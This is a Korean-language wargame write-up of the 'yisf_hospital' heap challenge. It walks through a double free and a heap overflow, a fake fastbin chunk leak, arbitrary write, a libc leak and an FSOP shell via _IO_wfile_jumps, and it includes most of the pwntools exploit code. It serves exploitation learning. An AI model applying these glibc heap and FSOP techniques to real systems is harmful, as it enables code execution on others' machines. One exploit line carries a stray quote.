---
title: "[DH] yisf_hospital writeup"
date: 2025-10-17 15:43:13 +0900
categories: [wargame, pwn]
tags: [calloc, fastbin]     # TAG names should always be lowercase
---

# 🚧 This writeup will be fortified 🚧

To see the post, you'll need the flag to access the content.
To be implemented later.

# Challenge & Analysis

```text
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```
{: file="checksec" }

문제를 보면 매우 간단한 힙 구성으로 되어있다.

병원의 예약을 할 수 있는 프로그램으로 총 6개의 옵션이 있고, 그중 view는 아무것도 안하는 함수이다.

```c
switch ( (unsigned int)menu() )
{
    case 1u:
    reservation();
    break;
    case 2u:
    reservation_cancel();
    break;
    case 3u:
    reservation_edit();
    break;
    case 4u:
    view_reservation_list();
    break;
    case 5u:
    ++reviewnum;
    review();
    break;
    case 6u:
    v3 = sys_exit(0);
    break;
    default:
    continue;
}
```

예약 존재 유무는 `reserve_list` 배열로 관리되고 예약이 있다면 1, 없다면 0으로 표기된다.
그리고 예약 정보는 `person` 배열로 관리된다. 이때 `free` 이후에 `person` 배열은 0으로 초기화 되지 않고 남아있다.


# Writeup

## TL;DR

Double free bug, heap overflow bug가 존재한다. 
그리고 릭을 위해서 glibc를 보면 `__libc_calloc`에는 아래와 같은 줄이 존재한다.

```c
  /* Two optional cases in which clearing not necessary */
  if (chunk_is_mmapped (p))
    {
      if (__builtin_expect (perturb_byte, 0))
        return memset (mem, 0, sz);

      return mem;
    }
```
{: file="malloc.c" }

그렇다. mmapped flag를 표기해두면 leak이 일어나는 것이다.<br>
필자는 glibc 소스코드를 소홀히 본 죄로 fake fastbin chunk를 2회 제작한 후 풀고 나서야 이 사실을 알게 되었다.


## Vulnerability



이중 `reservation`에서 메모리 할당이 calloc으로 이루어지고
`reservation_edit`에서 힙 조작, `reservation_cancel`에서 메모리 해제가 이루어진다.

`reservation_edit`에서는 `strcpy(person[v1 - 1]->name, src);`로 인해서 힙 오버플로우가 발생할 수 있다.
그리고 `reservation_cancel`에서는 

```c
free(person[v1 - 1]);
reserve_list[v1 - 1] = 0;
```

로 인해서 double free가 발생할 수 있다.

한편 `review`에서는 출력 없이 `malloc(0x500uLL)`가 발생하기에 이후에 libc를 릭하는데 사용할 수 있다. 
직접적으로 취약점이 있는 것은 아니지만, fastbin을 활용한 leak을 위해서 사용할 수 있다.


## Exploitation Steps

앞서 말했듯이 double free와 heap overflow가 존재한다.
이를 이용해서 어떻게든 leak만 하면 된다. 
is_mmapped flag를 세팅하는 방식을 사용한다면, 
정말 쉽게 leak이 가능했을 것이지만....몰랐기 때문에 fastbin을 이용하기로 했다.

> Fastbin 사용 이유.
>
> libc 2.35에서는 calloc과 realloc에서 tcache를 **건너뛴다.**
> 따라서 tcache가 있더라도 사용하지 못한다.
{: .prompt-info}

> Fastbin에는 할당될 때 victim chunk의 크기까지 확인하는 검사가 존재한다.
> 따라서 fastbin을 할당하고자 하는 위치의 size 필드에 정확히 0x21을 넣어주어야 한다.
>
> ```c
> size_t victim_idx = fastbin_index (chunksize (victim));
> if (__builtin_expect (victim_idx != idx, 0))
>     malloc_printerr ("malloc(): memory corruption (fast)");
> ```
{: .prompt-tip}


1. Fill tcache(->7회)
2. 이제부턴 fastbin으로 들어갈 것이므로 쭉 할당받고 fastbin을 채워준다.
3. review 기능으로 큰 청크를 할당받으면 fastbin의 청크들은 consolidate 된다. 
    대신 청크의 fd 같은 값들은 여전히 남아있다.
4. 아래와 같이 fastbin에 미리 가짜 청크를 입력해둔다.
    ```python
    """
    a*0x10 *3
    00000000 00000021
    xxxxxxxx xxxxxxxx
    xxxxxxxx aaaaaaaa
    """
    ```
4. 이제 double free를 이용해서 unsortedbin 청크를 free해버린다.
5. 이후 heap overflow를 활용한 bruteforce로 저 가짜 청크를 할당받는다.
6. 가짜 청크를 할당받았으므로, `reservation`에서 `print("%s")`에 의해 heapbase를 알 수 있다. 


성공적으로 구성되었을 때 힙이 이렇게 보일 것이다.

```python
"""
aaaaaaaa [......] <- unsortedbin chunk
[0x7f..] [0x7f..]
aaaaaaaa aaaaaaaa
...
aaaaaaaa aaaaaaaa
00000000 00000021   <- target fastbin chunk
xxxxxxxx xxxxxxxx   <- 여기로 가짜 청크가 들어오게 되면, reservation에서 `x`자리를 모두 char로 채우면 fd까지 출력된다.
xxxxxxxx aaaaaaaa   <- aaaaaaaa 자리는 원래 0x21이어야 함
[  fd  ] [  bk  ]   <- leak!
"""
```


heap overflow를 쉽게 사용하기 위해서 아래같은 헬퍼 함수를 만들어 두었다.

```python
def overwrite_nextheap(idx, data_size: bytes, data_fd=None):
    if data_fd is not None:
        edit_reserv(idx, b"a" * 0x8 + data_fd, b"a" * 8)
    for i in range(7):  # erase 'a's
        edit_reserv(idx, b"a" * (0x8 - i - 1), b"a" * 8)
    edit_reserv(idx, data_size, b"a" * 8)
```

이 부분이 exploit의 앞부분이다.

```python
for _ in trange(256):
    try:
        p = connect()
        review_cnt = 0
        p.sendlineafter(b">>> ", b"name")

        for i in range(1, 8):
            create_reserv(i, b"_", b"_")
            cancel_reserv(i)

        # stash these
        create_reserv(1, b"a", b"a")
        create_reserv(2, b"a", b"a")
        create_reserv(3, b"a", b"a")
        create_reserv(4, b"a", b"a")

        # unsortedbin
        # The b"\x00" * 0x10, p64(0x21) part give you additional leaks
        # by creating fake fast bins
        create_reserv(5, b"a", b"a")
        create_reserv(6, b"\x00" * 0x8 + p64(0x21), p64(0))
        create_reserv(7, b"a", b"a")
        create_reserv(8, b"a", b"a")
        create_reserv(9, b"a", b"a")
        create_reserv(10, b"a", b"a")
        cancel_reserv(7)
        cancel_reserv(8)
        cancel_reserv(10)
        cancel_reserv(9)

        """
        a*0x10 *3
        00000000 00000021
        xxxxxxxx xxxxxxxx
        xxxxxxxx aaaaaaaa
        """
        fake_block = b"x" * 0x30 + b"\x00" * 8 + p64(0x21) + b"x" * 0x20
        review_reserv(fake_block)
        create_reserv(10, b"a", b"a")
        cancel_reserv(7)

        cancel_reserv(6)
        cancel_reserv(5)
        overwrite_nextheap(4, p64(0x21), b"")

        create_reserv(7, b"b", b"b")
        create_reserv(8, b"C" * 0x10, b"C" * 8)
```
{: .file="exploit_front" }

> `create_reserv(6, b"\x00" * 0x8 + p64(0x21), p64(0))` 부분은 이후 libc를 leak하기 위해 또다른 fake chunk를 만드는 부분이다.
> 이걸 사용하는 시점부터는 이미 AAW이 가능하기 때문에 정확하게 이 위치를 청크로 사용할 수 있다.
{: .prompt-info}


이제 힙을 릭했으므로 좀 더 편하게 aaw 할 수 있는 `person` 배열로 힙을 할당해버리자.
그러기 위해서 마찬가지로 fake chunk를 만들어준다.


7. `reviewnum`을 증가시켜 0x21까지 키운다. 이렇게 되면, 할당자가 chunk size를 0x21가 맞다고 생각한다.
8. heap overflow를 이용해서 `reviewnum`쪽으로 fake chunk를 덮어쓴다.
9. 이제 index 1,2,3은 자유롭게 aaw 할 수 있는 청크가 된다.

```python
        leak = u64(p.recvuntil(b"\x0a\x70", drop=True).ljust(8, b"\x00"))
        heap_base = unsafe_link(leak) - 0x450
        print(f"[+] found heap base: {hex(heap_base)}")

        while review_cnt < 0x21:
            review_reserv()

        cancel_reserv(10)

        cancel_reserv(4)
        cancel_reserv(3)
        cancel_reserv(2)

        overwrite_nextheap(1, p64(0x21), p64(safelink(e.symbols["reviewnum"] - 0x8)))
        create_reserv(2, b"a", b"a")
        create_reserv(4, b"a", p64(0))  # person
        # I can control index 1, 2, 3 freely!
```


그러면 이제 aaw는 매우 간단하다.

```python
edit_reserv(4, p64(1), p64(ptr))
edit_reserv(1, data, p64(0))
```
이런식으로 해주면 된다.

조금만 더 작업해서 미리 만들어두었던 가짜 청크에 힙을 할당해서 릭을 해주기만 하면,

```python
        cancel_reserv(2)  # heap+0x3a0

        edit_reserv(4, p64(1), p64(heap_base + 0x3A0))
        edit_reserv(1, p64(safelink(heap_base + 0x420)), p64(2))
        create_reserv(2, b"a", b"a")
        create_reserv(3, b"L" * 0x10, b"L" * 8)
        p.recvuntil(b"LLLLLLLL")
        leak = u64(p.recvuntil(b"\x0a", drop=True).ljust(8, b"\x00"))
        libc = leak - 0x21ACE0'
        system = libc + le.symbols["system"]
```

마지막 RCE만 남았다.<br>
처음에는 `__run_exit_handlers`를 이용하려고 했으나, 문제는 `sys_exit`이 호출되면서 프로그램이 종료된다는 점이었다.
따라서 FSOP로 끝냈다.

```python
        def build(start, body):
            ptr = start
            body = body + b"\x00" * (8 - len(body) % 8)
            for i in range(len(body) // 8):
                if body[i * 8 : (i + 1) * 8] == b"\x00" * 8:
                    ptr += 8
                    continue

                edit_reserv(4, p64(1), p64(ptr))
                edit_reserv(1, body[i * 8 : (i + 1) * 8], p64(0))
                ptr += 8

        def build_fakefs(fs_target_addr):
            wfile_jumps = le.symbols["_IO_wfile_jumps"]
            distance = 0x150
            fs = FileStructure()
            fs.flags = 0x00000000FBAD2080 | int.from_bytes(b";sh", "little") << (4 * 8)
            fs._IO_write_base = 0
            fs._IO_buf_base = 0
            fs._lock = libc + le.bss() + 0x1000
            fs.vtable = libc + wfile_jumps + 0x18 - 0x38  # this
            fs._wide_data = fs_target_addr + distance
            wide_data = b""
            wide_data += p64(0)  # read ptr
            wide_data += p64(0)  # read end
            wide_data += p64(0)  # read base
            wide_data += p64(0)  # write base
            wide_data += p64(0)  # write ptr
            wide_data += p64(0)  # write end
            wide_data += p64(0)  # buf base
            wide_data += p64(0)  # buf end
            wide_data += p64(system)  # save base 0x40
            wide_data += b"\x00" * (0xE0 - len(wide_data))
            wide_data += p64(fs_target_addr + distance + 0x40 - 0x68)

            fakefs = b""
            print(fs)
            fakefs += bytes(fs)
            fakefs += b"\x00" * (distance - len(fakefs))  # padding to 0x150
            fakefs += wide_data
            return fakefs

        write_target = libc + 0x21C010
        build(write_target, build_fakefs(write_target))

        # trigger
        overwrite_nextheap(4, p64(0x404020))
        # edit_reserv(4, p64(1), p64(0x404020))

        # edit_reserv(2, p64(write_target) + p64(0), p64(write_target))
        p.sendlineafter(b">>> ", b"3")
        p.sendlineafter(b">>> ", str(2).encode())
        p.sendafter(b">>> ", p64(write_target))
        p.interactive()
```

주의할 점은 heap overflow에서 널바이트가 끼어 있으면 안 되서 write이 실패할 수도 있다는 점이다. 
그래서 `write_target = libc + 0x21C010`로 설정했다.

이렇게 작성해주면 쉘을 딸 수 있다.


## Extra Notes

- exit handlers RCE

난 `__run_exit_handlers`가 안 될 줄 알았는데 libc GOT overwrite까지 합치면 될거란 생각을 못했다...
libc GOT overwrite를 쓰면 쉘까진 ROP가 필요하다고 해도, 
그래도 여전히 임의함수 실행을 가능하게 해주는 녀석인지라, 
`initial` 함수 overwrite한 후에 `strlen`의 GOT를 `exit`으로 바꿔주면 되는 부분이다.


- fastbin fd

tcache의 next의 경우 **user 영역**을 가리키지만, fastbin의 fd는 **chunk의 메타데이터 영역**을 가리킨다.
따라서 fastbin을 조작할 때는 이 점을 유의해야 한다.

구체적인 차이도 이번 기회에 공부해보았다.

### libc chunk vs user chunk

```c
#define mem2chunk(mem) ((mchunkptr)tag_at (((char*)(mem) - CHUNK_HDR_SZ)))
#define chunk2mem_tag(p) ((void*)tag_at ((char*)(p) + CHUNK_HDR_SZ))
```

일반적으로 `p`로 표현되는 chunk 포인터는 메타데이터 영역을 가리킨다.
그리고 user_chunk는 일반적으로 `mem`으로 표현되며, 실제 사용자가 접근하는 영역을 가리킨다.

타입의 관점에서도 아래와 같이 `mchunkptr`은 메타데이터를 가리키는 포인터 타입이다.

```c
struct malloc_chunk {

  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */

  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;

  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
};
typedef struct malloc_chunk* mchunkptr;
```

이제 tcache와 fastbin에서 어떻게 다음 첨크를 가리키는지 보자.

```c
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  // chunk2mem is called!! -> user chunk
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);

  /* Mark this chunk as "in the tcache" so the test in _int_free will
     detect a double free.  */
  e->key = tcache_key;

  e->next = PROTECT_PTR (&e->next, tcache->entries[tc_idx]);
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}
```
{: file="tcache_put" }

```c
mchunkptr p;
...
unsigned int idx = fastbin_index(size);
fb = &fastbin (av, idx);  // = pointer to fastbin head
mchunkptr old = *fb, old2;  // old = old fastbin head
if (__builtin_expect (old == p, 0))  // double free check  note that it only checks privious head
    malloc_printerr ("double free or corruption (fasttop)");
p->fd = PROTECT_PTR (&p->fd, old);  // p is chunk pointer. setup p->fd to old head
*fb = p;  // now new head is p
```
{: file="_int_free" }


여기서 결론을 낼 수 있다. 
- tcache의 next 포인터는 user chunk를 가리킨다.
- fastbin의 fd 포인터는 chunk 메타데이터를 가리킨다.
- 다른 bin을 보더라도 chunk 메타데이터를 가리키는 경우가 많다.

즉, tcachebin만 user chunk를 가리키고, fastbin 및 다른 bin들은 chunk 메타데이터를 가리킨다고 정리할 수 있다.